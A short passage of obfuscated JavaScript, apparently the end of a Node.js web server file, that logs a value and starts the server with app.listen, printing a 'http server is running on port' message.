_0x2a31f3=_0x558b96;console[_0x2a31f3(0x24e)](_0x2a31f3(0x265),_0x1fdb20);}),app['listen'](PORT,()=>console[_0x558b96(0x23f)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
